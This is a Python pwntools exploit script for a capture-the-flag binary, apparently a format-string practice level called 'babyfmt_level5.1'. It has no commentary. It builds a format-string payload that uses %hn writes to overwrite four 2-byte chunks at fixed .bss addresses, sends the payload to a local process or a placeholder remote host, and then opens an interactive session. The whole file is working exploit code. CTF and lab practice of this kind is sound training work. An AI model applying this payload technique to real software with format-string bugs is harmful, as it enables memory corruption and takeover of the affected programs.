#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level5.1")

context.binary = exe

gdb_script = """
b *func+328
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    bss_addr = 0x404108

    payload = b"%7436c%40$hn%25313c%38$hn%3705c%39$hn%2163c%41$hnAAAAAAA" + p64(0x404108) + p64(0x40410a) + p64(0x40410c) + p64(0x40410e)
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
